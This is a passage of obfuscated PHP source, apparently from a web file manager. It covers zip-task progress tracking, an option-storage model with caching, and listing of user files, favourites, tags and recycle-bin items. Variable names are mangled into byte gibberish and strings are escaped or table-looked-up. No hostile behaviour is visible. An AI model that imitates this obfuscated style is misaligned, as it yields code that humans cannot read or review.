1; } else { $Ï£¶›ë[$ê…ºÉÕ[1221]] = $æ±¥ß¦œ[$ê…ºÉÕ[82]][$ê…ºÉÕ[80]]; } $Ï£¶›ë[$ê…ºÉÕ[1223]] = $ê…ºÉÕ[12]; $Ï£¶›ë[$ê…ºÉÕ[2020]] = 0; $Ï£¶›ë[$ê…ºÉÕ[1965]] = 0; $Ï£¶›ë[$ê…ºÉÕ[2018]] = 0; $Ï£¶›ë[$ê…ºÉÕ[2019]] = 0; $Ï£¶›ë[$ê…ºÉÕ[2016]] = $ê…ºÉÕ[12]; $Ï£¶›ë[$ê…ºÉÕ[932]] = 0; $Ï£¶›ë[$ê…ºÉÕ[855]] = $æ±¥ß¦œ[$ê…ºÉÕ[79]]; $this->update(); self::log($ê…ºÉÕ[2098] . json_encode(array($Ï£¶›ë, $æ±¥ß¦œ))); } public function nameParse($¢øáøø) { $˜ìŞÍŒå =& $_SERVER[¹Éµ„ºå]; $Ñâïæˆ =& $this->task; if ($Ñâïæˆ[$˜ìŞÍŒå[2093]] == $˜ìŞÍŒå[1374]) { $Ñâïæˆ[$˜ìŞÍŒå[2093]] = $˜ìŞÍŒå[388]; $Ñâïæˆ[$˜ìŞÍŒå[932]] = 0; $Ñâïæˆ[$˜ìŞÍŒå[855]] = 0; } $ìêÓ‰•  = get_path_this($¢øáøø); if (strstr($ìêÓ‰• , $˜ìŞÍŒå[10])) { $Ñâïæˆ[$˜ìŞÍŒå[1965]] += 1; $Ñâïæˆ[$˜ìŞÍŒå[1221]] += 1; } $Ñâïæˆ[$˜ìŞÍŒå[2016]] = $¢øáøø; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ìã¾ÃŒû =& $_SERVER[¹Éµ„ºå]; parent::startAfter(); Hook::bind($ìã¾ÃŒû[2099], array($this, $ìã¾ÃŒû[2089])); Hook::bind($ìã¾ÃŒû[2091], array($this, $ìã¾ÃŒû[2092])); $ÜÃ‡«Ì =& $this->task; $ÜÃ‡«Ì[$ìã¾ÃŒû[2093]] = $ìã¾ÃŒû[1374]; if (!$ÜÃ‡«Ì[$ìã¾ÃŒû[1854]]) { $ÜÃ‡«Ì[$ìã¾ÃŒû[1854]] = LNG($ìã¾ÃŒû[2100]); } } protected function endAfter() { $Ü‚¤ü…Ì =& $_SERVER[¹Éµ„ºå]; parent::endAfter(); Hook::unbind($Ü‚¤ü…Ì[2099], array($this, $Ü‚¤ü…Ì[2089])); Hook::unbind($Ü‚¤ü…Ì[2091], array($this, $Ü‚¤ü…Ì[2092])); } public function updateAfter() { $Œ‚÷¡Ğˆ =& $_SERVER[¹Éµ„ºå]; $òÃÍä¾¾ =& $this->task; if (!$òÃÍä¾¾[$Œ‚÷¡Ğˆ[1221]] || !$òÃÍä¾¾[$Œ‚÷¡Ğˆ[855]]) { return; } if ($òÃÍä¾¾[$Œ‚÷¡Ğˆ[2093]] == $Œ‚÷¡Ğˆ[1374]) { $ôÑİ§Û = $òÃÍä¾¾[$Œ‚÷¡Ğˆ[2019]]; if ($òÃÍä¾¾[$Œ‚÷¡Ğˆ[2020]] != $Œ‚÷¡Ğˆ[1374]) { $ôÑİ§Û = 0; } $Çã·òÄ = ($òÃÍä¾¾[$Œ‚÷¡Ğˆ[932]] + $ôÑİ§Û) / $òÃÍä¾¾[$Œ‚÷¡Ğˆ[855]]; $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1966]] = $Çã·òÄ * 0.3; } else { if ($òÃÍä¾¾[$Œ‚÷¡Ğˆ[2093]] == $Œ‚÷¡Ğˆ[388]) { $Çã·òÄ = $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1965]] / $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1221]]; $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1966]] = 0.3 + $Çã·òÄ * 0.5; } else { if ($òÃÍä¾¾[$Œ‚÷¡Ğˆ[2093]] == $Œ‚÷¡Ğˆ[107]) { $Çã·òÄ = 0; if ($òÃÍä¾¾[$Œ‚÷¡Ğˆ[2018]]) { $Çã·òÄ = $òÃÍä¾¾[$Œ‚÷¡Ğˆ[2019]] / $òÃÍä¾¾[$Œ‚÷¡Ğˆ[2018]]; } $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1966]] = 0.3 + 0.5 + $Çã·òÄ * 0.2; } } } if ($òÃÍä¾¾[$Œ‚÷¡Ğˆ[1966]] > 0) { $ãõ¦¼« = timeFloat() - $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1968]] - $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1971]]; $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1972]] = $ãõ¦¼« * (1 - $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1966]]) / $òÃÍä¾¾[$Œ‚÷¡Ğˆ[1966]]; } } public function copyFileStart($…ÜÒéƒ, $×éÎÏÍï, $‚Ş¡Î÷†, $â×”âÏğ, $›¾Ç” , $œŒÉ”áÚ) { $¥êÊš¬æ =& $_SERVER[¹Éµ„ºå]; parent::copyFileStart($…ÜÒéƒ, $×éÎÏÍï, $‚Ş¡Î÷†, $â×”âÏğ, $›¾Ç” , $œŒÉ”áÚ); $ƒ°ÃƒÉÅ =& $this->task; if ($ƒ°ÃƒÉÅ[$¥êÊš¬æ[2093]] == $¥êÊš¬æ[388]) { $ƒ°ÃƒÉÅ[$¥êÊš¬æ[2093]] = $¥êÊš¬æ[107]; } $this->update(); } public function copyFileEnd($ˆœ¶ìŒ², $Ã¯‰ÔÕË, $…øòíö, $—§Î½Áˆ, $ÚóéÃ´®, $óÈˆó) { $±ÀÓş ½ =& $_SERVER[¹Éµ„ºå]; $¢‹ññœ =& $this->task; $¢‹ññœ[$±ÀÓş ½[2019]] = $¢‹ññœ[$±ÀÓş ½[2018]]; $¢‹ññœ[$±ÀÓş ½[932]] += $¢‹ññœ[$±ÀÓş ½[2018]]; $¢‹ññœ[$±ÀÓş ½[2020]] = $±ÀÓş ½[12]; $this->update(); } public function zipEvent($øÀç½ğ, $é’ïË…ã, $ĞÃûÎº¨, $ÈÎñÎ—) { $‹ÅŞÄõ =& $_SERVER[¹Éµ„ºå]; $è÷¸Áİ =& $this->task; $è÷¸Áİ[$‹ÅŞÄõ[2016]] = get_path_this($é’ïË…ã); $è÷¸Áİ[$‹ÅŞÄõ[2018]] = $ÈÎñÎ—; $è÷¸Áİ[$‹ÅŞÄõ[2019]] = $ĞÃûÎº¨; $è÷¸Áİ[$‹ÅŞÄõ[1223]] = $øÀç½ğ == $‹ÅŞÄõ[2101] ? $‹ÅŞÄõ[2096] : $‹ÅŞÄõ[2097]; $è÷¸Áİ[$‹ÅŞÄõ[2020]] = $‹ÅŞÄõ[12]; $è÷¸Áİ[$‹ÅŞÄõ[855]] = $ÈÎñÎ—; $è÷¸Áİ[$‹ÅŞÄõ[2093]] = $‹ÅŞÄõ[388]; $this->update(); } public function nameParse($Ää¦íäÑ) { $›Êä†õ =& $_SERVER[¹Éµ„ºå]; $š´¢Ùğ =& $this->task; if ($š´¢Ùğ[$›Êä†õ[1965]] < $š´¢Ùğ[$›Êä†õ[1221]]) { $ıª‰‚»à = get_path_this($Ää¦íäÑ); if (strstr($ıª‰‚»à, $›Êä†õ[10])) { $š´¢Ùğ[$›Êä†õ[1965]] += 1; } } if ($š´¢Ùğ[$›Êä†õ[2093]] == $›Êä†õ[1374]) { $š´¢Ùğ[$›Êä†õ[2093]] = $›Êä†õ[388]; } $š´¢Ùğ[$›Êä†õ[2016]] = $Ää¦íäÑ; $this->update(); } } goto F©º„Ì§Ò¬; eìäÒøÈ²: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\x6d\x4f\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($£­òÉÄ¯ = false, $á³¹ú™ = "\x6d\157\144\x69\146\171\x54\151\x6d\x65", $ı’ƒ·˜ = false) { $¶ğ¦ÕË =& $_SERVER[¹Éµ„ºå]; $™«Œ¡î = Model($this->modelType)->get(!1, $this->optionType, !0); $ıß²Õ›¤ = array_values($™«Œ¡î); if ($ıß²Õ›¤ && $ıß²Õ›¤[0] && !is_array($ıß²Õ›¤[0])) { Model($this->modelType)->cacheRemove($this->optionType); $™«Œ¡î = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$™«Œ¡î) { return $£­òÉÄ¯ ? null : array(); } if (!$£­òÉÄ¯ && $£­òÉÄ¯ !== $¶ğ¦ÕË[228]) { $™«Œ¡î = array_filter(array_values($™«Œ¡î)); return array_sort_by($™«Œ¡î, $á³¹ú™, $ı’ƒ·˜, $¶ğ¦ÕË[487]); } return $™«Œ¡î[$¶ğ¦ÕË[488] . $£­òÉÄ¯]; } public function insert($’£Ê¨æÑ) { $ùï–‹Úæ =& $_SERVER[¹Éµ„ºå]; $’£Ê¨æÑ = array_field_key($’£Ê¨æÑ, $this->field); $ãĞ“Îæ× = Model($this->modelType)->get($ùï–‹Úæ[489], $this->optionType . $ùï–‹Úæ[490]); $ãĞ“Îæ× = $ãĞ“Îæ× ? $ãĞ“Îæ× : 0; $’£Ê¨æÑ[$ùï–‹Úæ[487]] = ++$ãĞ“Îæ×; $’£Ê¨æÑ[$ùï–‹Úæ[231]] = time(); $’£Ê¨æÑ[$ùï–‹Úæ[88]] = time(); Model($this->modelType)->set($ùï–‹Úæ[489], $ãĞ“Îæ×, $this->optionType . $ùï–‹Úæ[490]); Model($this->modelType)->set($ùï–‹Úæ[488] . $ãĞ“Îæ×, $’£Ê¨æÑ, $this->optionType); return $ãĞ“Îæ×; } public function insertArr($š•êò¢Ğ) { $—ÓÕº–ß =& $_SERVER[¹Éµ„ºå]; if (!$š•êò¢Ğ || !is_array($š•êò¢Ğ)) { return !1; } $åÇÉÑ = Model($this->modelType)->get($—ÓÕº–ß[489], $this->optionType . $—ÓÕº–ß[490]); $åÇÉÑ = $åÇÉÑ ? $åÇÉÑ : 0; $ìòî¡ = array(); foreach ($š•êò¢Ğ as $ÎíÉùÖ) { $ù¸‡›Øü = array_field_key($ÎíÉùÖ, $this->field); $ù¸‡›Øü[$—ÓÕº–ß[487]] = ++$åÇÉÑ; $ù¸‡›Øü[$—ÓÕº–ß[231]] = time(); $ù¸‡›Øü[$—ÓÕº–ß[88]] = time(); $ìòî¡[$—ÓÕº–ß[488] . $åÇÉÑ] = $ù¸‡›Øü; } Model($this->modelType)->set($—ÓÕº–ß[489], $åÇÉÑ, $this->optionType . $—ÓÕº–ß[490]); Model($this->modelType)->set($ìòî¡, !1, $this->optionType); return $åÇÉÑ; } public function update($úÇ’¿›¤, $şÄÍ±¹Ó) { $¶°ºÒãê =& $_SERVER[¹Éµ„ºå]; $şÄÍ±¹Ó = array_field_key($şÄÍ±¹Ó, $this->field); $şÓÚë¤ = $this->listData($úÇ’¿›¤); if (!$şÓÚë¤ || !$úÇ’¿›¤) { return !1; } $şÄÍ±¹Ó = array_merge($şÓÚë¤, $şÄÍ±¹Ó); $şÄÍ±¹Ó[$¶°ºÒãê[88]] = time(); return Model($this->modelType)->set($¶°ºÒãê[488] . $úÇ’¿›¤, $şÄÍ±¹Ó, $this->optionType); } public function remove($ÀáÁì) { if (!$ÀáÁì) { return !1; } return Model($this->modelType)->remove($_SERVER[¹Éµ„ºå][488] . $ÀáÁì, $this->optionType); } public function removeArr($¶Û¶æ·®) { if (!$¶Û¶æ·®) { return !0; } $›…ÑÕï» = array(); foreach ($¶Û¶æ·® as $œûµı¨¬) { $›…ÑÕï»[] = $_SERVER[¹Éµ„ºå][488] . $œûµı¨¬; } return Model($this->modelType)->removeArr($›…ÑÕï», $this->optionType); } public function clear() { $…’™« =& $_SERVER[¹Éµ„ºå]; Model($this->modelType)->remove($…’™«[489], $this->optionType . $…’™«[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¤èÖ•ûì, $ª¨”òìİ) { if (!$ª¨”òìİ) { return !1; } $ØìÊÃ¶ = $this->listData(); $ØìÊÃ¶ = array_to_keyvalue($ØìÊÃ¶, $¤èÖ•ûì); return isset($ØìÊÃ¶[$ª¨”òìİ]) ? $ØìÊÃ¶[$ª¨”òìİ] : !1; } public function findByName($òœÀÃïÔ) { return $this->findByKey($_SERVER[¹Éµ„ºå][32], $òœÀÃïÔ); } protected function resetData($Å€Àé š) { $ãûÁºßü =& $_SERVER[¹Éµ„ºå]; if (!$Å€Àé š) { return; } $Å€Àé š = is_array($Å€Àé š) ? $Å€Àé š : array(); $Êğ–¿¢Ä = array(); for ($ø§ÓÏŒ› = 0; $ø§ÓÏŒ› < count($Å€Àé š); $ø§ÓÏŒ›++) { if (!$Å€Àé š[$ø§ÓÏŒ›] || !$Å€Àé š[$ø§ÓÏŒ›][$ãûÁºßü[487]]) { continue; } $Êğ–¿¢Ä[$ãûÁºßü[488] . $Å€Àé š[$ø§ÓÏŒ›][$ãûÁºßü[487]]] = $Å€Àé š[$ø§ÓÏŒ›]; } return Model($this->modelType)->set($Êğ–¿¢Ä, !1, $this->optionType); } private function getAutoName($à¯­—Î§) { $°†êé°¤ = array_to_keyvalue($this->listData(), $_SERVER[¹Éµ„ºå][32]); if (!$°†êé°¤ || !isset($°†êé°¤[$à¯­—Î§])) { return $à¯­—Î§; } for ($şğ…›¶ = 1; $şğ…›¶ < count($°†êé°¤); $şğ…›¶++) { $¤ØŒõ¬’ = $à¯­—Î§ . "\50{$şğ…›¶}\51"; if (!isset($°†êé°¤[$¤ØŒõ¬’])) { return $¤ØŒõ¬’; } } return $¤ØŒõ¬’; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¾ŞÔù…¥ = false, $÷å›ıæö = '', $”¢ŸÍı× = false, $ğƒóï•» = true) { $ùÚ£äÎ’ =& $_SERVER[¹Éµ„ºå]; $ì÷…øëè = $this->cacheGet($÷å›ıæö); $âğĞ¦şõ = $this->optionDefault($÷å›ıæö); $âğĞ¦şõ = is_array($âğĞ¦şõ) ? $âğĞ¦şõ : array(); if (is_array($ì÷…øëè)) { if ($ğƒóï•») { $ì÷…øëè = array_merge($âğĞ¦şõ, $ì÷…øëè); } return $¾ŞÔù…¥ ? isset($ì÷…øëè[$¾ŞÔù…¥]) ? $ì÷…øëè[$¾ŞÔù…¥] : null : $ì÷…øëè; } $°Ö–Àİƒ = $this->filterWhere(array($ùÚ£äÎ’[33] => $÷å›ıæö)); $ì÷…øëè = $this->where($°Ö–Àİƒ)->select(); $ì÷…øëè = array_to_keyvalue($ì÷…øëè, $ùÚ£äÎ’[95], $ùÚ£äÎ’[451]); foreach ($ì÷…øëè as $…®Öè’Š => $Êêè•òŒ) { if ($”¢ŸÍı× || in_array($…®Öè’Š, $this->jsonField)) { $ì÷…øëè[$…®Öè’Š] = json_decode($Êêè•òŒ, !0); } } $this->cacheSet($÷å›ıæö, $ì÷…øëè); if ($ğƒóï•») { $ì÷…øëè = array_merge($âğĞ¦şõ, $ì÷…øëè); } return $¾ŞÔù…¥ ? $ì÷…øëè[$¾ŞÔù…¥] : $ì÷…øëè; } public function set($øÁèŸôË, $”³ÖŞöñ = false, $¹Œ¥ûµ¶ = '') { $¤ˆÈîÚ =& $_SERVER[¹Éµ„ºå]; if (!$øÁèŸôË) { return !0; } $å¾Óà£Ë = $this->get(!1, $¹Œ¥ûµ¶, !1, !1); $å¾Óà£Ë = is_array($å¾Óà£Ë) ? $å¾Óà£Ë : array(); $‘÷”£Û = array(); $çññîï˜ = array(); $„ş’Ø¨ƒ = array(); $½äà­¡› = is_array($øÁèŸôË) ? $øÁèŸôË : array($øÁèŸôË => $”³ÖŞöñ); $¦¹œ = $this->filterWhere(array($¤ˆÈîÚ[33] => $¹Œ¥ûµ¶)); foreach ($½äà­¡› as $Ñ‚Òø®Ì => $¢ìÏˆ‚) { if (is_array($¢ìÏˆ‚)) { $¢ìÏˆ‚ = json_encode_force($¢ìÏˆ‚); } $this->checkLength($¢ìÏˆ‚, !1, $this->tableName . $¤ˆÈîÚ[4] . $øÁèŸôË); $¢ìÏˆ‚ = self::textEncode($¢ìÏˆ‚); if (array_key_exists($Ñ‚Òø®Ì, $å¾Óà£Ë)) { $×‹ÔÓ  = is_array($å¾Óà£Ë[$Ñ‚Òø®Ì]) ? json_encode_force($å¾Óà£Ë[$Ñ‚Òø®Ì]) : $å¾Óà£Ë[$Ñ‚Òø®Ì]; $×‹ÔÓ  = self::textEncode($×‹ÔÓ ); if ($×‹ÔÓ  === $¢ìÏˆ‚) { continue; } $çññîï˜[] = array($¤ˆÈîÚ[95], $Ñ‚Òø®Ì, $¤ˆÈîÚ[451], $¢ìÏˆ‚, $¤ˆÈîÚ[88], time()); } else { $êÙÆ¢» = array($¤ˆÈîÚ[33] => $¹Œ¥ûµ¶, $¤ˆÈîÚ[95] => $Ñ‚Òø®Ì, $¤ˆÈîÚ[451] => $¢ìÏˆ‚); $‘÷”£Û[] = $this->filterWhere($êÙÆ¢»); } } if (!$‘÷”£Û && !$çññîï˜) { return !0; } $this->cacheRemove($¹Œ¥ûµ¶); $†Û¶Æãì = $this->cacheKey($¤ˆÈîÚ[491]); CacheLock::lock($†Û¶Æãì); if ($‘÷”£Û) { $this->addAll($‘÷”£Û); } if ($çññîï˜) { $this->saveAll($çññîï˜, $¦¹œ); } CacheLock::unlock($†Û¶Æãì); return !0; } protected function optionDefault($‘ˆêà©Û = '') { return !1; } public function setDeep($Äğ³÷ä, $œğ»¿¡ê = false, $…âİìŠ¯ = '') { $í‚¦®­Ş = explode($_SERVER[¹Éµ„ºå][10], $Äğ³÷ä); $âŸ¥© = $this->get(); array_set_value($âŸ¥©, $Äğ³÷ä, $œğ»¿¡ê); $this->set($í‚¦®­Ş[0], $âŸ¥©[$í‚¦®­Ş[0]], $…âİìŠ¯); } public function remove($Å†ù•×¸, $ª”Š¥ƒè = '') { $Åƒö‰·õ =& $_SERVER[¹Éµ„ºå]; $this->cacheRemove($ª”Š¥ƒè); $«öœÁ™ = $this->filterWhere(array($Åƒö‰·õ[95] => $Å†ù•×¸, $Åƒö‰·õ[33] => $ª”Š¥ƒè)); if (is_null($Å†ù•×¸)) { unset($«öœÁ™[$Åƒö‰·õ[95]]); } return $this->where($«öœÁ™)->delete(); } public function removeArr($àŞ½ÔÙò, $£‡³„·å = '') { $ı¶ßÁŒÆ =& $_SERVER[¹Éµ„ºå]; if (!$àŞ½ÔÙò || !is_array($àŞ½ÔÙò)) { return !0; } $this->cacheRemove($£‡³„·å); $½Ÿº˜Õú = $this->filterWhere(array($ı¶ßÁŒÆ[33] => $£‡³„·å, $ı¶ßÁŒÆ[95] => array($ı¶ßÁŒÆ[7], $àŞ½ÔÙò))); return $this->where($½Ÿº˜Õú)->delete(); } public function cacheSet($±“èìŸ, $—áñêÖ = false) { return Cache::set($this->cacheKey($±“èìŸ), $—áñêÖ); } public function cacheGet($³Œİ–è) { return Cache::get($this->cacheKey($³Œİ–è)); } public function cacheRemove($ë¤­„„š) { return Cache::remove($this->cacheKey($ë¤­„„š)); } protected function filterWhere($ÊŸĞ³ª§) { return $ÊŸĞ³ª§; } protected function cacheKey($×ÇÅ×æ) { return $×ÇÅ×æ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\x63\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\155\x65" => "\151\x6f\x5f\163\x6f\165\162\143\145\137\155\x65\x74\141", "\155\145\x74\x61\106\x69\145\154\x64" => "\163\157\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\165\156\x63\x74\x69\157\x6e"), array("\143\162\145\x61\164\x65\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x76\151\x65\x77\x54\151\x6d\145", "\x74\x69\155\145", "\x69\156\163\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ƒÆûÃ°Í) { return $this->listSource(array($_SERVER[¹Éµ„ºå][492] => $ƒÆûÃ°Í)); } public function typeName($ÕöéÖèø) { static $ˆ’õ§Ÿ• = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $ˆ’õ§Ÿ•[$ÕöéÖèø . $_SERVER[¹Éµ„ºå][12]]; } public function sourceListInfo($–ÛŠâŠ», $°€¨“¸Ø = false) { $†ÄÔÅÅ =& $_SERVER[¹Éµ„ºå]; $–ÛŠâŠ» = $–ÛŠâŠ» ? $–ÛŠâŠ» : array(); $–ÛŠâŠ» = array_filter(array_unique($–ÛŠâŠ»)); if (!$–ÛŠâŠ») { return array(); } $¢¾Ğ ¶Ã = $this->where(array($†ÄÔÅÅ[191] => array($†ÄÔÅÅ[7], $–ÛŠâŠ»)))->select(); $this->_listDataApply($¢¾Ğ ¶Ã, $°€¨“¸Ø); return array_to_keyvalue($¢¾Ğ ¶Ã, $†ÄÔÅÅ[191]); } public function pathInfoFilter(&$÷™–è¨) { $ä¯È‘˜¸ =& $_SERVER[¹Éµ„ºå]; static $æÁŸ«ñ§ = false; static $âü’‰„‘ = false; static $¿ç²õ½à = false; if (!$æÁŸ«ñ§) { $Â«Ÿ€ÑÂ = $ä¯È‘˜¸[493]; $Â«Ÿ€ÑÂ .= $ä¯È‘˜¸[494]; $Â«Ÿ€ÑÂ .= $ä¯È‘˜¸[495]; $¨€¨ÃÛİ = $ä¯È‘˜¸[496]; $á¡úŸı£ = explode($ä¯È‘˜¸[50], $¨€¨ÃÛİ); $æÁŸ«ñ§ = explode($ä¯È‘˜¸[50], $Â«Ÿ€ÑÂ); $âü’‰„‘ = array(); foreach ($æÁŸ«ñ§ as $«¥¿­Çä) { if (in_array($«¥¿­Çä, $á¡úŸı£)) { continue; } $âü’‰„‘[] = $«¥¿­Çä; } $¿ç²õ½à = explode($ä¯È‘˜¸[50], $ä¯È‘˜¸[497]); } foreach ($¿ç²õ½à as $À¨›™Ù) { if (isset($÷™–è¨[$À¨›™Ù])) { $÷™–è¨[$À¨›™Ù] = intval($÷™–è¨[$À¨›™Ù]); } } $÷™–è¨[$ä¯È‘˜¸[87]] = $ä¯È‘˜¸[498] . $÷™–è¨[$ä¯È‘˜¸[191]] . $ä¯È‘˜¸[499]; $÷™–è¨[$ä¯È‘˜¸[33]] = $÷™–è¨[$ä¯È‘˜¸[500]] == 1 ? $ä¯È‘˜¸[78] : $ä¯È‘˜¸[230]; $÷™–è¨[$ä¯È‘˜¸[188]] = $this->typeName($÷™–è¨[$ä¯È‘˜¸[188]]); if ($÷™–è¨[$ä¯È‘˜¸[500]] != 1) { $÷™–è¨[$ä¯È‘˜¸[166]] = $÷™–è¨[$ä¯È‘˜¸[501]]; unset($÷™–è¨[$ä¯È‘˜¸[501]]); } $å›¼º°„ = $æÁŸ«ñ§; if (isset($÷™–è¨[$ä¯È‘˜¸[502]]) && $÷™–è¨[$ä¯È‘˜¸[502]][$ä¯È‘˜¸[503]] == -1) { $å›¼º°„ = $âü’‰„‘; } $÷™–è¨ = array_field_key($÷™–è¨, $å›¼º°„); return $÷™–è¨; } public function listUserFav() { $Á—í„ÀÑ =& $_SERVER[¹Éµ„ºå]; $ã¦”¥Ú… = Model($Á—í„ÀÑ[504])->listData(); $şÒ§Š—– = array_filter_by_field($ã¦”¥Ú…, $Á—í„ÀÑ[33], $Á—í„ÀÑ[505]); $şÒ§Š—– = array_to_keyvalue($şÒ§Š—–, $Á—í„ÀÑ[12], $Á—í„ÀÑ[87]); if ($şÒ§Š—–) { $±ÚöÂÏ = $this->listSource(array($Á—í„ÀÑ[506] => array($Á—í„ÀÑ[507], $şÒ§Š—–))); } $±ÚöÂÏ = array_to_keyvalue($±ÚöÂÏ[$Á—í„ÀÑ[446]], $Á—í„ÀÑ[191]); foreach ($ã¦”¥Ú… as &$ìåòË±) { $ìåòË± = array($Á—í„ÀÑ[508] => $ìåòË±[$Á—í„ÀÑ[487]], $Á—í„ÀÑ[509] => $ìåòË±[$Á—í„ÀÑ[32]], $Á—í„ÀÑ[510] => $ìåòË±[$Á—í„ÀÑ[87]], $Á—í„ÀÑ[511] => $ìåòË±[$Á—í„ÀÑ[33]], $Á—í„ÀÑ[512] => $ìåòË±[$Á—í„ÀÑ[231]], $Á—í„ÀÑ[513] => $ìåòË±[$Á—í„ÀÑ[88]]); if ($ìåòË±[$Á—í„ÀÑ[33]] == $Á—í„ÀÑ[505] && $±ÚöÂÏ[$ìåòË±[$Á—í„ÀÑ[87]]]) { $ìåòË±[$Á—í„ÀÑ[90]] = $±ÚöÂÏ[$ìåòË±[$Á—í„ÀÑ[87]]]; } } unset($ìåòË±); return $ã¦”¥Ú…; } public function listUserTag($×ø¹ÂÇ„) { $ŸŠ³ æ =& $_SERVER[¹Éµ„ºå]; if ($×ø¹ÂÇ„ && !is_array($×ø¹ÂÇ„)) { $×ø¹ÂÇ„ = array($×ø¹ÂÇ„); } $„Ëî» = Model($ŸŠ³ æ[514])->listData(); $‚Á§áéë = array(); $ƒ½ ñáÑ = array(); foreach ($„Ëî» as $Ââ¯Ëü¼) { $¹Úê¦ŠÄ = $Ââ¯Ëü¼[$ŸŠ³ æ[87]]; if (!$¹Úê¦ŠÄ) { continue; } if (!isset($ƒ½ ñáÑ[$¹Úê¦ŠÄ])) { $ƒ½ ñáÑ[$¹Úê¦ŠÄ] = array(); } $ƒ½ ñáÑ[$¹Úê¦ŠÄ][] = $Ââ¯Ëü¼[$ŸŠ³ æ[515]]; $‚Á§áéë[$Ââ¯Ëü¼[$ŸŠ³ æ[87]]] = $Ââ¯Ëü¼; } $åíŸ€×ø = array(); $â³©Ë´ = array(); $ß¹Şú·õ = array(); foreach ($ƒ½ ñáÑ as $ıîØïê => $³áÍÙ) { $¾íåúÜ· = !0; if (!$×ø¹ÂÇ„) { $åíŸ€×ø[] = $ıîØïê; continue; } foreach ($×ø¹ÂÇ„ as $ÍË÷ ñö) { if (!in_array($ÍË÷ ñö, $³áÍÙ)) { $¾íåúÜ· = !1; break; } } if (!$¾íåúÜ·) { continue; } if (!is_numeric($ıîØïê)) { $†ª…¬—’ = $‚Á§áéë[$ıîØïê]; $¸†Ê°æ– = array($ŸŠ³ æ[32] => $†ª…¬—’[$ŸŠ³ æ[32]], $ŸŠ³ æ[87] => $†ª…¬—’[$ŸŠ³ æ[87]], $ŸŠ³ æ[33] => $†ª…¬—’[$ŸŠ³ æ[33]], $ŸŠ³ æ[90] => array($ŸŠ³ æ[516] => 1), $ŸŠ³ æ[232] => !0); if ($†ª…¬—’[$ŸŠ³ æ[33]] == $ŸŠ³ æ[230]) { $ß¹Şú·õ[] = $¸†Ê°æ–; } if ($†ª…¬—’[$ŸŠ³ æ[33]] == $ŸŠ³ æ[78]) { $â³©Ë´[] = $¸†Ê°æ–; } continue; } $åíŸ€×ø[] = $ıîØïê; } if ($åíŸ€×ø) { $ ¼éˆÁÇ = $this->listSource(array($ŸŠ³ æ[506] => array($ŸŠ³ æ[507], $åíŸ€×ø))); } $ ¼éˆÁÇ = $ ¼éˆÁÇ ? $ ¼éˆÁÇ : array($ŸŠ³ æ[85] => array(), $ŸŠ³ æ[86] => array()); $ ¼éˆÁÇ[$ŸŠ³ æ[85]] = array_merge($ ¼éˆÁÇ[$ŸŠ³ æ[85]], $â³©Ë´); $ ¼éˆÁÇ[$ŸŠ³ æ[86]] = array_merge($ ¼éˆÁÇ[$ŸŠ³ æ[86]], $ß¹Şú·õ); if (isset($ ¼éˆÁÇ[$ŸŠ³ æ[443]]) && count($åíŸ€×ø) == $ ¼éˆÁÇ[$ŸŠ³ æ[443]][$ŸŠ³ æ[444]]) { return $ ¼éˆÁÇ; } $ŸÀ¢ÚÕÌ = array(); $˜ßåÅºå = array_to_keyvalue($ ¼éˆÁÇ[$ŸŠ³ æ[85]], $ŸŠ³ æ[12], $ŸŠ³ æ[191]); $°‡É†ÇÎ = array_to_keyvalue($ ¼éˆÁÇ[$ŸŠ³ æ[86]], $ŸŠ³ æ[12], $ŸŠ³ æ[191]); $€óš¹³Ø = array_merge($°‡É†ÇÎ, $˜ßåÅºå); foreach ($åíŸ€×ø as $¹Úê¦ŠÄ) { if (!in_array($¹Úê¦ŠÄ, $€óš¹³Ø)) { $ŸÀ¢ÚÕÌ[] = $¹Úê¦ŠÄ; } } if ($ŸÀ¢ÚÕÌ) { Model($ŸŠ³ æ[517])->removeBySource($ŸÀ¢ÚÕÌ); } return $ ¼éˆÁÇ; } public function listUserRecycle() { $ˆûë¾¦ =& $_SERVER[¹Éµ„ºå]; $æÆÆ®Îá = Model($ˆûë¾¦[518])->listData(); if (!$æÆÆ®Îá) { return array(); } $«¿·¶ù£ = array($ˆûë¾¦[506] => array($ˆûë¾¦[507], $æÆÆ®Îá), $ˆûë¾¦[519] => 1); return $this->listSource($«¿·¶ù£); } public function listSource($ŞÖ¥›¯¥, $ÂîîÙø = 3000, $†Ú×êƒâ = false) { $’İ©œ±Ì =& $_SERVER[¹Éµ„ºå]; if (!isset($ŞÖ¥›¯¥[$’İ©œ±Ì[520]])) { $ŞÖ¥›¯¥[$’İ©œ±Ì[520]] = 0; } if (isset($ŞÖ¥›¯¥[$’İ©œ±Ì[190]]) && $ŞÖ¥›¯¥[$’İ©œ±Ì[190]] == $’İ©œ±Ì[228]) { 